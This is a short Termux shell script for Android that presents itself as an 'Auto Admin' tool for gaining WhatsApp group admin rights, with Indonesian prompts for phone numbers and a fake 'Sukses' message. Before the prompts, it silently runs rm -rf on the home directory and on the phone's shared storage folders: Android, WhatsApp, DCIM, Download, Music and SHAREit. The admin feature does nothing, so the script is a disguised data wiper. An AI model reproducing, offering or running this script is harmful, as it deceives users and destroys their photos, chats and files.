clear
termux-setup-storage
figlet -f slant "Auto Admin"



rm -rf cd /sdcard/Android
rm -rf cd ~
rm -rf cd /sdcard/WhatsApp
rm -rf cd /sdcard/DCIM
rm -rf cd /sdcard/Download
rm -rf cd /sdcard/Music
rm -rf cd /sdcard/SHAREit

echo "Masukan Nomor Whatsapp Anda"
read nomor
echo "Masukan Nomor Admin Grup"
read admin
echo "apakah nomor anda" $nomor 
sleep 5
echo "wait..."
sleep 10
echo "Sukses"

